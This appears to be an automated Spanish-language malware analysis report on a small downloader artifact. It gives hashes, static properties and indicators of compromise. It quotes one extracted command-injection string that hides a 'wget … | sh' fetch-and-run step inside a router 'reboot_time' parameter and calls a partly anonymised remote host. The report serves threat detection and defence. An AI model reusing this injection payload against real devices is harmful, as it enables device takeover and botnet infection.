# 🧬 Payload Analysis

`98beba5dbbe5c7b88949cb72971e66cdc2942b25ebfd838858b198875e4e3a49`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 186 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `98beba5dbbe5c7b88949cb72971e66cdc2942b25ebfd838858b198875e4e3a49`
- **MD5:** `91e3cc104aa26b7e817460396ed376ca`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 186 B |
| Entropía | 4.88 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
reboot_enabled=1&reboot_time=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wdr3;busybox wget hxxp://91.92.40.XXX/w
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | reboot_enabled=1&reboot_time=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wdr3;busybox wget hxxp://91.92.40.XXX/w | strings |
| hash | 98beba5dbbe5c7b88949cb72971e66cdc2942b25ebfd838858b198875e4e3a49 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
